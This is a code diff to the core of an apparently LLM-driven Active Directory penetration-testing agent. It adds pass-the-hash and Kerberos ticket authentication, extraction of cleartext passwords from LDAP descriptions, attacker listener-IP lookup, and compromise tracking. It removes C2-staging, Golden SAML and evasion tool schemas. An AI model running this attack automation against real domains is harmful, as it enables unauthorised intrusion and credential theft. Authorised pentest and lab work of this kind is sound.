@@ -33,7 +33,10 @@ from utils.helpers import (
     BABY_BLUE, LIGHT_PINK, SOFT_PINK, PURE_WHITE, SOFT_WHITE,
     imp, _SYSPY, _IMP_DIR,
 )
-from config.settings import SESSION, OUTPUT_DIR, save_session, redact_obj, redact_text, SHOW_SECRETS
+from config.settings import (
+    SESSION, OUTPUT_DIR, save_session, redact_obj, redact_text, SHOW_SECRETS,
+    reset_engagement_state, reset_session_for_target_change,
+)
 
 # ── Package submodule imports ─────────────────────────────────────────────────
 from modules.agent.constants import (
@@ -43,7 +46,7 @@ from modules.agent.constants import (
     OLLAMA_API_TIMEOUT, OLLAMA_MAX_TOOLS,
     OLLAMA_SHOW_FALLBACK_WARNINGS, OLLAMA_FORCE_LLM_DECISION,
     OPSEC_MODE, LDAP_PORT, LDAPS_PORT, SMB_PORT, WINRM_PORT,
-    AGENT_BLUE, AGENT_PINK, AGENT_TEXT, AGENT_WHITE, AGENT_GREEN, AGENT_WARN,
+    AGENT_BLUE, AGENT_PINK, AGENT_TEXT, AGENT_WHITE,
 )
 from modules.agent.backends import _ollama_chat_completion
 from modules.agent.logger import AgentMarkdownLog
@@ -331,6 +334,20 @@ def _ccache_is_valid(ccache: str, username: str = "", domain: str = "") -> bool:
     except Exception:
         return False
 
+
+def _active_priv_ccache(username: str = "", domain: str = "") -> str:
+    """Return the verified privileged ADCS ccache when shell-ready, else "".
+    request_tgt and other Kerberos flows mutate SESSION['krb5_ccache'] and can
+    downgrade it back to a plain (unprivileged) user TGT. This stable pointer —
+    set only after a validated certipy-auth — lets WinRM/lateral tools use the
+    PAC-injected (e.g. ESC13 OID-linked group) ticket instead of the plain TGT,
+    which is what makes the shell actually work. Target-agnostic."""
+    intel = _agent_intel()
+    cc = intel.get("adcs_ccache", "")
+    if intel.get("adcs_shell_ready") and cc and _ccache_is_valid(cc, username, domain):
+        return cc
+    return ""
+
 def _session_kerberos_usable(username: str = "", domain: str = "") -> bool:
     """True only when Kerberos mode has an existing, non-expired ccache."""
     ccache = SESSION.get("krb5_ccache", "")
@@ -341,6 +358,29 @@ def _session_kerberos_usable(username: str = "", domain: str = "") -> bool:
         SESSION["use_kerberos"] = False
         SESSION["krb5_ccache"] = ""
     return ok
+
+def _add_owned_machine(machine, **attrs) -> None:
+    """Record an owned host, deduped by machine identity (target-agnostic).
+
+    Several tools (evil_winrm, lateral_movement, discover_winrm_access,
+    shadow_credentials, ...) can each pwn the SAME host, every time with a
+    slightly different dict (method/time/user). Appending blindly inflated the
+    list — and the report's machine count — with duplicate entries for one box.
+    Dedup on the normalized 'machine' value; if it already exists, merge in any
+    new non-empty attributes (e.g. fill nt_hash/method) instead of appending a
+    copy."""
+    machine = str(machine or "").strip()
+    if not machine:
+        return
+    bucket = SESSION.setdefault("owned_machines", [])
+    key = machine.lower()
+    for entry in bucket:
+        if str(entry.get("machine", "")).strip().lower() == key:
+            for k, v in attrs.items():
+                if v and not entry.get(k):
+                    entry[k] = v
+            return
+    bucket.append({"machine": machine, **attrs})
 
 BAD_AD_TARGETS = {
     "", "none", "null", "undefined", "found", "target", "user", "computer",
@@ -503,12 +543,13 @@ def _extract_bloodyad_candidate_dn(text: str) -> str:
 
 def _reset_agent_runtime_state() -> None:
     """Keep each agent report tied to evidence from the current run."""
-    SESSION["commands_run"] = []
-    SESSION["findings"] = []
-    SESSION["owned_users"] = []
-    SESSION["owned_machines"] = []
-    SESSION["loot"] = {}
-    SESSION["agent_intel"] = {}
+    keep_kerberos = {
+        "use_kerberos": SESSION.get("use_kerberos", False),
+        "krb5_ccache": SESSION.get("krb5_ccache", ""),
+        "krb5_config": SESSION.get("krb5_config", "/etc/krb5.conf"),
+    }
+    reset_engagement_state()
+    SESSION.update(keep_kerberos)
 
 def _redact_args_for_display(args: dict) -> dict:
     """Display real secrets when enabled, but never present *** as a real value."""
@@ -525,13 +566,23 @@ def _redact_args_for_display(args: dict) -> dict:
             safe[k] = v
     return safe
 
+def _json_safe(value):
+    """Convert runtime helper objects (Path, sets, custom keys) into JSON-safe data."""
+    if isinstance(value, dict):
+        return {str(k): _json_safe(v) for k, v in value.items()}
+    if isinstance(value, (list, tuple, set)):
+        return [_json_safe(v) for v in value]
+    if isinstance(value, Path):
+        return str(value)
+    return value
+
 def _format_arg_value(value, max_len: int = 96) -> str:
     if value in ("", None, [], {}):
         return "-"
     if isinstance(value, bool):
         text = "yes" if value else "no"
     elif isinstance(value, (list, tuple, dict)):
-        text = json.dumps(value, ensure_ascii=False, default=str)
+        text = json.dumps(_json_safe(value), ensure_ascii=False, default=str)
     else:
         text = str(value)
     text = text.replace("\n", " ").strip()
@@ -678,14 +729,18 @@ def _load_sast_skills() -> dict:
     Returns {category: [techniques]} with commands, severity, MITRE.
     """
     import re as _re
-    sast_dir = Path(__file__).parent.parent.parent / "ActiveDirectory-SAST"
+    # _core.py lives at modules/agent/_core.py; the SAST knowledge base sits at
+    # the repo root (ActiveDirectory-SAST/). parents[2] = repo root.
+    # (.parent.parent pointed at modules/ — which never existed — so the entire
+    # 93-technique knowledge base silently loaded as empty: _TOTAL_TECHNIQUES=0.)
+    sast_dir = Path(__file__).resolve().parents[2] / "ActiveDirectory-SAST"
     skills: dict = {}
 
     if not sast_dir.exists():
         return skills
 
     for f in sorted(sast_dir.glob("*.yml")):
-        if f.stem in ("README",):
+        if f.stem in ("README", "tool_sast_analysis"):
             continue
         try:
             content = f.read_text()
@@ -748,40 +803,6 @@ SAST_SKILLS: dict = _load_sast_skills()
 _TOTAL_TECHNIQUES = sum(len(v) for v in SAST_SKILLS.values())
 
 
-def _load_opsec_signatures() -> dict:
-    """Load tool_sast_analysis.yml and build detection-signature lookup.
-    Returns {tool_name: {detection_risk, evasion_notes, noisy}} used by the
-    OPSEC-aware decision layer to bias tool selection in stealth/normal modes."""
-    import re as _re
-    sast_dir = Path(__file__).parent.parent.parent / "ActiveDirectory-SAST"
-    sig_file = sast_dir / "tool_sast_analysis.yml"
-    if not sig_file.exists():
-        return {}
-    try:
-        content = sig_file.read_text()
-    except Exception:
-        return {}
-    sigs: dict = {}
-    blocks = _re.split(r'\n  - id:', content)
-    for block in blocks[1:]:
-        tool_m  = _re.search(r'tool:\s*(\S+)', block)
-        risk_m  = _re.search(r'detection_risk:\s*(\w+)', block)
-        notes_m = _re.search(r'evasion:\s*>?\s*\n?(.*?)(?=\n    \w|\n  \w|\Z)', block, _re.S)
-        noisy_m = _re.search(r'noisy:\s*(true|false)', block, _re.I)
-        if not tool_m:
-            continue
-        tool = tool_m.group(1).strip()
-        sigs[tool] = {
-            'detection_risk': risk_m.group(1).strip().upper() if risk_m else 'MEDIUM',
-            'evasion_notes':  ' '.join((notes_m.group(1) or '').split())[:200] if notes_m else '',
-            'noisy':          (noisy_m.group(1).lower() == 'true') if noisy_m else False,
-        }
-    return sigs
-
-
-OPSEC_SIGNATURES: dict = _load_opsec_signatures()
-
-
 def _build_skills_prompt() -> str:
     """
     Build a compact skills reference for the system prompt.
@@ -823,29 +844,9 @@ def _build_skills_prompt() -> str:
         "- If Protected Users (STATUS_ACCOUNT_RESTRICTION) → Kerberos only, use faketime",
         "- If GPO write access → immediate code execution via SharpGPOAbuse",
         "- If trust relationship exists → enumerate for ExtraSID/SID History attack",
-        "- If ADFS server found → try adfs_attack for Golden SAML / PHS DCSync",
-        "- If WSUS server found via GPO/registry → try wsus_attack for SYSTEM code exec",
-        "- If gMSA candidates exist → gmsa_read first, then gmsa_takeover if writable ACL",
-        "- If RODC found → rodc_attack for PRP cached creds or Key List attack",
-        "- If shell access → local_privesc_chain before lateral movement",
-        "- If Azure/hybrid environment → azure_entra for PRT/device-code/token attacks",
-        "- If SCCM found → sccm_abuse for NAA credentials (often domain admin)",
         "- OPSEC: prefer read-only operations first; noisy ops only after confirming path",
-        "- OPSEC: in stealth/normal mode avoid mass spray — target known-valid accounts",
         "",
     ]
-
-    # Append OPSEC tool signatures if loaded
-    if OPSEC_SIGNATURES and OPSEC_MODE != "loud":
-        noisy_tools = [t for t, s in OPSEC_SIGNATURES.items() if s.get('noisy')]
-        if noisy_tools:
-            lines += [
-                "## OPSEC TOOL RISK (from SAST analysis)",
-                "",
-                f"High-noise tools to avoid unless path confirmed: {', '.join(noisy_tools[:12])}",
-                "",
-            ]
-
     return '\n'.join(lines)
 
 
@@ -857,11 +858,10 @@ def _merge_agent_intel(intel: dict) -> None:
         "users", "computers", "spns", "asrep_users", "admin_users", "esc_vulns",
         "winrm_access", "winrm_targets", "readable_shares", "creds_in_files", "acl_paths",
         "script_path_edges", "delegation", "ccaches", "flags", "valid_creds",
+        "validated_creds",
         "wsus_servers", "local_privesc_hints", "gmsa_candidates",
-        "gmsa_read_dead_for", "acl_scan_dead_for",
-        "adfs_servers", "wsus_servers_confirmed", "rodc_controllers",
-        "sccm_servers", "azure_tokens", "local_privesc_paths",
-        "trust_domains", "c2_sessions",
+        "gmsa_read_dead_for", "gmsa_read_tried_for", "acl_scan_dead_for",
+        "desc_passwords", "valid_creds_tested",
     ]
     dict_keys = ["nt_hashes", "gmsa_hashes"]
     bool_keys = ["pwn3d", "is_da", "ntlm_disabled", "adcs_shell_ready", "bloodhound_failed_nonblocking"]
@@ -888,15 +888,17 @@ def _agent_intel() -> dict:
         "users": [], "computers": [], "spns": [], "asrep_users": [], "admin_users": [],
         "esc_vulns": [], "winrm_access": [], "winrm_targets": [], "readable_shares": [],
         "creds_in_files": [], "acl_paths": [], "script_path_edges": [], "delegation": [],
-        "ccaches": [], "flags": [], "valid_creds": [], "wsus_servers": [],
+        "ccaches": [], "flags": [], "valid_creds": [], "validated_creds": [],
+        "wsus_servers": [],
         "local_privesc_hints": [], "gmsa_candidates": [],
-        "gmsa_read_dead_for": [], "acl_scan_dead_for": [],
-        "adfs_servers": [], "wsus_servers_confirmed": [], "rodc_controllers": [],
-        "sccm_servers": [], "azure_tokens": [], "local_privesc_paths": [],
-        "trust_domains": [], "c2_sessions": [],
+        "gmsa_read_dead_for": [], "gmsa_read_tried_for": [],
+        "acl_scan_dead_for": [], "desc_passwords": [], "valid_creds_tested": [],
         "nt_hashes": {}, "gmsa_hashes": {},
         "pwn3d": False, "is_da": False, "ntlm_disabled": False,
-        "adcs_shell_ready": False, "bloodhound_failed_nonblocking": False,
+        "adcs_shell_ready": False, "adcs_ccache": "",
+        "bloodhound_failed_nonblocking": False,
+        "last_adcs_scan_used_kerberos": False,
+        "last_adcs_needs_retry_after_tgt": False,
     }
     stored = SESSION.get("agent_intel", {})
     merged = {k: stored.get(k, v) for k, v in defaults.items()}
@@ -980,11 +982,36 @@ def _known_gmsa_accounts() -> list[str]:
     return names
 
 
+def _attacker_ip() -> str:
+    """Return configured listener IP, or infer it from attacker_iface."""
+    ip = str(SESSION.get("attacker_ip") or "").strip()
+    if ip:
+        return ip
+    iface = str(SESSION.get("attacker_iface") or "").strip()
+    if not iface:
+        return ""
+    try:
+        out = subprocess.check_output(
+            ["ip", "-4", "-o", "addr", "show", "dev", iface],
+            text=True,
+            stderr=subprocess.DEVNULL,
+            timeout=2,
+        )
+    except Exception:
+        return ""
+    m = re.search(r"\binet\s+(\d+\.\d+\.\d+\.\d+)/", out)
+    if not m:
+        return ""
+    ip = m.group(1)
+    SESSION["attacker_ip"] = ip
+    return ip
+
+
 def _shell_export_prefix() -> list[str]:
     dc = SESSION.get("dc_ip", "<dc_ip>")
     dom = SESSION.get("domain", "<domain>")
     dc_fqdn = _dc_host_for_kerberos(dom, dc) if dom and dc else "<dc_fqdn>"
-    attacker = SESSION.get("attacker_ip", "<attacker_ip>")
+    attacker = _attacker_ip() or "<attacker_ip>"
     return [
         f"export DC_IP={dc}",
         f"export DOMAIN={dom}",
@@ -1573,6 +1600,8 @@ def _sanitize_tool_inputs(name: str, inputs: dict) -> dict:
     _attacker_lower = (_sess_usr or "").lower().strip("\\/@$")
     if _attacker_lower:
         for _k in _self_target_keys:
+            if name == "pass_the_cert" and _k == "target_user":
+                continue
             _v = str(inputs.get(_k, "")).lower().strip("\\/@$")
             # Strip DOMAIN\ or @realm decorations before comparing.
             _v_stem = _v.split("\\")[-1].split("@")[0]
@@ -1591,7 +1620,19 @@ def _sanitize_tool_inputs(name: str, inputs: dict) -> dict:
     accepted_keys = set(tool_schema.get("properties", {}).keys())
 
     if "password" in accepted_keys:
-        inputs["password"] = _sess_pw
+        supplied_pw = _real_secret(inputs.get("password", ""))
+        supplied_user = str(inputs.get("username", "")).strip()
+        # Preserve explicit per-credential passwords for validation/pivot tools.
+        # Otherwise a discovered credential such as jane.smith:Welcome123 is
+        # silently paired with the original session password.
+        if (supplied_pw and supplied_user and _sess_usr
+                and not _same_ad_account(supplied_user, _sess_usr)
+                and name in {"test_credential", "discover_winrm_access", "evil_winrm",
+                             "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
+                             "acl_abuse_scan", "gmsa_read"}):
+            inputs["password"] = supplied_pw
+        else:
+            inputs["password"] = _sess_pw
     # Do NOT inject NT hash when:
     # - caller explicitly set nt_hash="" (Kerberos-only mode after ADCS exploit)
     # - NTLM is disabled and Kerberos is active (hash would fail anyway)
@@ -1619,13 +1660,20 @@ def _sanitize_tool_inputs(name: str, inputs: dict) -> dict:
         "asrep_roast", "kerberoast", "adcs_scan", "acl_abuse_scan",
             "force_change_password_pivot", "logon_script_abuse", "credential_loot",
             "auto_loot_chain", "request_tgt", "windows_privesc_recon",
-            "gmsa_read", "gmsa_takeover",
+            "gmsa_takeover",
             "discover_winrm_access",
     }
+    explicit_pivot_user = (
+        "username" in inputs
+        and str(inputs.get("username", "")).strip()
+        and not _placeholder_re.match(str(inputs.get("username", "")))
+        and not _same_ad_account(str(inputs.get("username", "")), _sess_usr)
+    )
     if ("username" in accepted_keys
             and (name in session_identity_tools
                  or not inputs.get("username")
                  or _placeholder_re.match(str(inputs.get("username", ""))))
+            and not (name == "gmsa_read" and explicit_pivot_user)
             and _sess_usr):
         inputs["username"] = _sess_usr
 
@@ -1727,7 +1775,9 @@ def _analyze_result(tool_name: str, result: str) -> dict:
         "gmsa_hashes":        {},   # {account: nt_hash}
         "gmsa_candidates":    [],   # gMSA accounts discovered in LDAP/ACL output
         "computers":          [],   # AD computer accounts (sAMAccountName ending with $)
-        "valid_creds":        [],   # validated creds discovered from loot
+        "valid_creds":        [],   # credentials discovered from loot/descriptions
+        "validated_creds":    [],   # protocol validation results for discovered creds
+        "desc_passwords":     [],   # cleartext passwords found in LDAP Description fields
         "wsus_servers":       [],   # WSUS hosts from ports/policy
         "local_privesc_hints": [],  # scheduled tasks, writable update dirs, ADCS/WSUS hints
         "pwn3d":              False,
@@ -1755,9 +1805,21 @@ def _analyze_result(tool_name: str, result: str) -> dict:
         "smb request is not supported",
         "80090302",
     ]
-    if any(s in r for s in ntlm_disabled_signals):
+    # Only flag ntlm_disabled if the signal comes from the actual target DC,
+    # not from a random host found during a subnet scan.
+    _dc_ip = SESSION.get("dc_ip", "")
+    _dc_host = str(SESSION.get("dc_hostname") or SESSION.get("dc_fqdn") or "").lower()
+    for _line in result.splitlines():
+        _ll = _line.lower()
+        if not any(s in _ll for s in ntlm_disabled_signals):
+            continue
+        # For line-based signals (ntlm:false), require target DC on same line
+        if "ntlm:false" in _ll or "ntlm:false" in _ll:
+            if _dc_ip and _dc_ip not in _ll and _dc_host and _dc_host not in _ll:
+                continue
         intel["ntlm_disabled"] = True
         SESSION["ntlm_disabled"] = True
+        break
 
     if any(s in r for s in ("8530", "8531", "wsus", "wuserver", "windowsupdate")):
         wsus_hosts = re.findall(r'https?://([A-Za-z0-9_.-]+)(?::853[01])?', result, re.I)
@@ -1787,8 +1849,16 @@ def _analyze_result(tool_name: str, result: str) -> dict:
         if host and host not in intel["winrm_targets"]:
             intel["winrm_targets"].append(host)
 
-    # DA check
-    if "domain admins" in r or "s-1-5-21.*-512" in r:
+    # DA check — require SID (whoami /all) or current user explicitly in DA membership
+    _username_l = SESSION.get("username", "").lower()
+    _da_by_sid = bool(re.search(r's-1-5-21-\d+-\d+-\d+-512', r))
+    _da_by_whoami = (
+        _username_l
+        and _username_l in r
+        and bool(re.search(r'domain\s*admins', r))
+        and bool(re.search(r'enabled\s*group|group_enabled|\(pwn3d\)', r, re.I))
+    )
+    if _da_by_sid or _da_by_whoami:
         intel["is_da"] = True
 
     # NT hashes (secretsdump / certipy auth output)
@@ -1832,19 +1902,21 @@ def _analyze_result(tool_name: str, result: str) -> dict:
     # Machine account SPNs: HOST/, WSMAN/, TERMSRV/, GC/, RestrictedKrbHost/, etc.
     _MACHINE_SPN_PREFIXES = (
         "host/", "wsman/", "termsrv/", "gc/", "restrictedkrbhost/",
-        "dns/", "hyper-v ", "microsoft virtual", "dfsr-", "rpc/",
+        "dns/", "hyper-v", "microsoft virtual", "microsoft ", "dfsr-", "rpc/",
         "ldap/", "e3514235-", "exchangemdb/", "msomsdksvc/",
     )
-    for m in re.finditer(r'servicePrincipalName\s*:\s*(\S+)', result, re.I):
-        spn = m.group(1)
+    for m in re.finditer(r'servicePrincipalName\s*:\s*(.+)', result, re.I):
+        spn = m.group(1).strip()
         spn_l = spn.lower()
-        # Only record SPNs that belong to user/service accounts (not computer accounts)
-        if not any(spn_l.startswith(p) for p in _MACHINE_SPN_PREFIXES):
-            intel["spns"].append(spn)
+        # Skip placeholder "None" and machine account SPNs
+        if spn_l in ("none", "") or any(spn_l.startswith(p) for p in _MACHINE_SPN_PREFIXES):
+            continue
+        intel["spns"].append(spn)
     # from GetUserSPNs output (these are always user/service account SPNs)
+    # hash format: $krb5tgs$23$*username$DOMAIN$spn/host*$...
     for m in re.finditer(r'\$krb5tgs\$(\d+)\$\*([^*]+)\*', result):
-        user = m.group(2).split("@")[0]
-        if user not in intel["spns"]:
+        user = m.group(2).split("$")[0]
+        if user and user not in intel["spns"]:
             intel["spns"].append(user)
 
     # AS-REP roastable
@@ -1927,9 +1999,18 @@ def _analyze_result(tool_name: str, result: str) -> dict:
 
     # gMSA accounts and hashes. Tools vary a lot in formatting, so accept
     # both explicit NT labels and NetExec/gMSADumper hash lines.
+    _GMSA_EXCLUDE = {"krbtgt$", "krb5tgs$", "krb5asrep$", "sntp-ms$"}
     for m in re.finditer(r'\b([A-Za-z0-9_.-]+\$)\b', result):
         acct = m.group(1)
-        if acct.lower() not in {"krbtgt$"} and acct not in intel["gmsa_candidates"]:
+        # Filter false positives: kerberoast tokens, timeroast tokens, all-uppercase
+        # domain names (e.g. DOMAIN$), and 32-char hex hash fragments suffixed with $
+        if acct.lower() in _GMSA_EXCLUDE:
+            continue
+        if re.fullmatch(r'[a-f0-9]{32}\$', acct, re.IGNORECASE):  # hex hash artifact
+            continue
+        if acct == acct.upper():  # all-caps = domain name, not an account
+            continue
+        if acct not in intel["gmsa_candidates"]:
             intel["gmsa_candidates"].append(acct)
 
     for acct, nt in _valid_gmsa_hashes(_extract_gmsa_hashes_from_text(result)).items():
@@ -1970,57 +2051,28 @@ def _analyze_result(tool_name: str, result: str) -> dict:
         if not Path("/tmp/users.txt").exists() or len(intel["users"]) > 3:
             Path("/tmp/users.txt").write_text("\n".join(set(intel["users"])))
 
-    # ── New intel: ADFS servers ───────────────────────────────────────────────
-    for m in re.finditer(r'(?:adfs|sts|federation)[.\-][\w.]+', result, re.I):
-        srv = m.group(0).lower()
-        if srv not in intel.setdefault("adfs_servers", []):
-            intel["adfs_servers"].append(srv)
-    for m in re.finditer(r'FederationMetadata|tokenSigningCertificate|ADFS\s+service', result, re.I):
-        if "adfs_found" not in intel.setdefault("local_privesc_hints", []):
-            intel["local_privesc_hints"].append("adfs_found")
-
-    # ── WSUS confirmed servers ────────────────────────────────────────────────
-    for m in re.finditer(r'https?://([A-Za-z0-9_.-]+)(?::853[01])', result, re.I):
-        srv = m.group(1)
-        if srv not in intel.setdefault("wsus_servers_confirmed", []):
-            intel["wsus_servers_confirmed"].append(srv)
-
-    # ── RODC controllers ─────────────────────────────────────────────────────
-    for m in re.finditer(r'Read[- ]?Only.*?DC\s*[:\-]\s*([A-Za-z0-9_.-]+)', result, re.I):
-        rodc = m.group(1)
-        if rodc not in intel.setdefault("rodc_controllers", []):
-            intel["rodc_controllers"].append(rodc)
-    if re.search(r'IsReadOnly\s*:\s*True|msDS-KrbTgtLink|RODC', result, re.I):
-        if "rodc_found" not in intel.setdefault("local_privesc_hints", []):
-            intel["local_privesc_hints"].append("rodc_found")
-
-    # ── SCCM / MECM servers ───────────────────────────────────────────────────
-    for m in re.finditer(r'(?:SCCM|MECM|Configuration Manager|mSSMSSiteCode)[^:]*:\s*([A-Za-z0-9_.-]+)', result, re.I):
-        srv = m.group(1)
-        if srv not in intel.setdefault("sccm_servers", []):
-            intel["sccm_servers"].append(srv)
-
-    # ── Trust domains ─────────────────────────────────────────────────────────
-    for m in re.finditer(r'trustPartner\s*:\s*([A-Za-z0-9._-]+)', result, re.I):
-        td = m.group(1)
-        if td not in intel.setdefault("trust_domains", []):
-            intel["trust_domains"].append(td)
-
-    # ── Local privesc paths from new tools ───────────────────────────────────
-    for m in re.finditer(r'(?:SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|AlwaysInstallElevated|'
-                         r'Unquoted Service Path|Writable Service|DLL Hijack|'
-                         r'PowerUp|WSUS.*HTTP|TOKEN IMPERSONATION)',
-                         result, re.I):
-        hint = m.group(0)[:50]
-        if hint not in intel.setdefault("local_privesc_paths", []):
-            intel["local_privesc_paths"].append(hint)
-
-    # ── C2 sessions ───────────────────────────────────────────────────────────
-    for m in re.finditer(r'(?:Sliver|Havoc|Cobalt Strike|Metasploit|beacon|implant|session\s+opened)[^:]*:\s*([A-Za-z0-9_.-]+)',
-                         result, re.I):
-        sess = m.group(1)
-        if sess not in intel.setdefault("c2_sessions", []):
-            intel["c2_sessions"].append(sess)
+    # NXC LDAP --users: extract cleartext passwords from the Description column.
+    # Format per line: "LDAP  <ip>  <port>  <dc>  <username>  <date> <time>  <badpw>  <description>"
+    for m in re.finditer(
+            r'LDAP\s+\S+\s+\d+\s+\S+\s+(\S+)\s+\S+\s+\S+\s+\d+\s+(.+)',
+            result, re.I):
+        user_d, desc = m.group(1).strip(), m.group(2).strip()
+        if user_d.startswith('-') or not _valid_ad_target(user_d):
+            continue
+        pw_m = re.search(
+            r'(?:temp\s*)?(?:pwd?|pass(?:word)?)\s*[:=]?\s*(\S{4,128})',
+            desc, re.I)
+        if pw_m:
+            pw = pw_m.group(1).strip().rstrip('.,;')
+            if 4 <= len(pw) <= 128:
+                if pw not in intel["desc_passwords"]:
+                    intel["desc_passwords"].append(pw)
+                cred = {"user": user_d, "password": pw, "auth": "desc"}
+                if cred not in intel["valid_creds"]:
+                    intel["valid_creds"].append(cred)
+                pair = (user_d, pw)
+                if pair not in intel["creds_in_files"]:
+                    intel["creds_in_files"].append(pair)
 
     _merge_agent_intel(intel)
     return intel
@@ -2723,7 +2775,7 @@ TOOLS = [
     },
     {
         "name": "run_module",
-        "description": "Run any specific AdStrike module by number for advanced operations not covered by other tools.",
+        "description": "Run any specific AdAgent module by number for advanced operations not covered by other tools.",
         "input_schema": {
             "type": "object",
             "properties": {
@@ -3195,112 +3247,6 @@ TOOLS = [
             "required": ["dc_ip", "domain", "username"]
         }
     },
-    {
-        "name": "adfs_attack",
-        "description": "ADFS/Golden SAML attacks: enumerate ADFS configuration, extract token signing certificate via DKM, attempt Golden SAML forge, and check PTA/PHS hybrid paths.",
-        "input_schema": {
-            "type": "object",
-            "properties": {
-                "dc_ip":      {"type": "string"},
-                "domain":     {"type": "string"},
-                "username":   {"type": "string"},
-                "password":   {"type": "string"},
-                "nt_hash":    {"type": "string"},
-                "adfs_server":{"type": "string", "description": "ADFS server hostname or IP (blank = auto-discover)"},
-                "action":     {"type": "string", "enum": ["enumerate","dkm_extract","golden_saml","pta_check"], "description": "Attack phase"}
-            },
-            "required": ["dc_ip", "domain", "username"]
-        }
-    },
-    {
-        "name": "wsus_attack",
-        "description": "WSUS attack: discover WSUS server via GPO/registry, check HTTP vs HTTPS, guidance for pywsus fake-update injection for SYSTEM code execution.",
-        "input_schema": {
-            "type": "object",
-            "properties": {
-                "dc_ip":    {"type": "string"},
-                "domain":   {"type": "string"},
-                "username": {"type": "string"},
-                "password": {"type": "string"},
-                "nt_hash":  {"type": "string"},
-                "wsus_server": {"type": "string", "description": "WSUS server hostname or IP (blank = auto-discover)"}
-            },
-            "required": ["dc_ip", "domain", "username"]
-        }
-    },
-    {
-        "name": "local_privesc_chain",
-        "description": "Full local privilege escalation chain on a compromised host: PowerUp checks, SeImpersonatePrivilege (Potato), unquoted service paths, AlwaysInstallElevated, WSUS client, ADCS on-box.",
-        "input_schema": {
-            "type": "object",
-            "properties": {
-                "target_ip": {"type": "string", "description": "Host where WinRM/shell access exists"},
-                "domain":    {"type": "string"},
-                "username":  {"type": "string"},
-                "password":  {"type": "string"},
-                "nt_hash":   {"type": "string"}
-            },
-            "required": ["target_ip", "domain", "username"]
-        }
-    },
-    {
-        "name": "trust_chain_planner",
-        "description": "Multi-domain / multi-forest trust chain analysis: enumerate trusts, identify ExtraSID/SID-History paths, cross-forest Kerberoast, and build a prioritised escalation plan.",
-        "input_schema": {
-            "type": "object",
-            "properties": {
-                "dc_ip":    {"type": "string"},
-                "domain":   {"type": "string"},
-                "username": {"type": "string"},
-                "password": {"type": "string"},
-                "nt_hash":  {"type": "string"}
-            },
-            "required": ["dc_ip", "domain", "username"]
-        }
-    },
-    {
-        "name": "c2_stage",
-        "description": "C2 payload staging guidance: generate Sliver/Havoc/MSF payload, host via HTTP, deliver via WMI/WinRM/SMB, and verify beacon callback.",
-        "input_schema": {
-            "type": "object",
-            "properties": {
-                "target_ip":  {"type": "string"},
-                "domain":     {"type": "string"},
-                "username":   {"type": "string"},
-                "password":   {"type": "string"},
-                "nt_hash":    {"type": "string"},
-                "c2_type":    {"type": "string", "enum": ["sliver","havoc","msf","auto"], "description": "C2 framework"},
-                "attacker_ip":{"type": "string", "description": "Your listener IP"}
-            },
-            "required": ["target_ip", "domain", "username"]
-        }
-    },
-    {
-        "name": "rediscover_target",
-        "description": "Re-run target discovery from within the agent: LDAP rootDSE, nxc SMB, nmap AD ports. Use when DC IP or domain info needs refreshing mid-engagement.",
-        "input_schema": {
-            "type": "object",
-            "properties": {
-                "dc_ip": {"type": "string", "description": "Target IP to re-discover"}
-            },
-            "required": ["dc_ip"]
-        }
-    },
-    {
-        "name": "opsec_check",
-        "description": "Check detection capabilities on a target host: EDR/AV processes, Windows Defender status, Sysmon, MDI sensor, LAPS, MDE. Used to choose evasion strategy.",
-        "input_schema": {
-            "type": "object",
-            "properties": {
-                "target_ip": {"type": "string"},
-                "domain":    {"type": "string"},
-                "username":  {"type": "string"},
-                "password":  {"type": "string"},
-                "nt_hash":   {"type": "string"}
-            },
-            "required": ["target_ip", "domain", "username"]
-        }
-    },
 ]
 
 
@@ -3577,6 +3523,8 @@ def _auth_args_nxc(username: str, password: str = "", nt_hash: str = "",
     kdc = dc_ip or SESSION.get("dc_ip", "")
     nt_hash = _real_nt_hash(nt_hash)
     password = _real_secret(password)
+    if SESSION.get("ntlm_disabled") and _session_kerberos_usable(username, dom):
+        return f"-u '{username}' -k --use-kcache --kdcHost {kdc} -d {dom}"
     if nt_hash:
         return f"-u '{username}' -H '{nt_hash}' -d {dom}"
     if password and not SESSION.get("ntlm_disabled"):
@@ -3804,14 +3752,16 @@ def tool_nmap_scan(target_ip: str) -> str:
     # Store open ports so other tools can check availability without re-scanning
     if open_ports:
         SESSION.setdefault("agent_intel", {})["open_ports"] = open_ports
-        # Detect NTLM via SMB negotiation — nxc or nmap shows NTLM:False when off
+        # Nmap-time SMB banners are only hints. Do not switch the whole agent
+        # into Kerberos mode until a credentialed enum/auth step proves NTLM is
+        # actually blocked; otherwise Round 2 jumps to request_tgt too early.
         if "445" in open_ports:
             smb_ntlm_check = _run(
                 f"nxc smb {target_ip} 2>&1 | grep -i 'NTLM'", timeout=10
             )
             if "NTLM:False" in smb_ntlm_check or "ntlm: false" in smb_ntlm_check.lower():
-                SESSION["ntlm_disabled"] = True
-                SESSION.setdefault("agent_intel", {})["ntlm_disabled"] = True
+                SESSION["ntlm_disabled_hint"] = True
+                SESSION.setdefault("agent_intel", {})["ntlm_disabled_hint"] = True
     save_session()
     return f"NMAP OUTPUT:\n{out[:3000]}"
 
@@ -4455,6 +4405,31 @@ def tool_collect_bloodhound(dc_ip: str, domain: str, username: str,
     )
 
 
+def _neo4j_reachable(uri: str = "bolt://localhost:7687", timeout: float = 2.0) -> bool:
+    """Fast TCP check that a Neo4j bolt endpoint is listening — lets callers skip
+    cypher-shell (and its JVM warnings + long connect errors) when the DB is down."""
+    import socket
+    m = re.search(r"//([^:/]+)(?::(\d+))?", uri or "")
+    host = m.group(1) if m else "localhost"
+    port = int(m.group(2)) if (m and m.group(2)) else 7687
+    try:
+        with socket.create_connection((host, port), timeout=timeout):
+            return True
+    except OSError:
+        return False
+
+
+def _strip_jvm_noise(text: str) -> str:
+    """Drop the harmless JVM/Jansi/Unsafe deprecation warnings cypher-shell prints
+    to stderr so they don't drown the actual query output."""
+    skip = ("WARNING:", "sun.misc.Unsafe", "native-access", "JansiLoader",
+            "PlatformDependent", "enable-native-access", "Restricted method")
+    return "\n".join(
+        ln for ln in (text or "").splitlines()
+        if not any(s in ln for s in skip)
+    ).strip()
+
+
 def tool_query_bloodhound_paths(domain: str, owned_user: str,
                                 neo4j_uri: str = "bolt://localhost:7687",
                                 neo4j_user: str = "neo4j",
@@ -4466,6 +4441,17 @@ def tool_query_bloodhound_paths(domain: str, owned_user: str,
             "cypher-shell not found. Import output/bloodhound/*.zip into BloodHound and "
             "use the GUI queries manually: Shortest Paths to Domain Admins and "
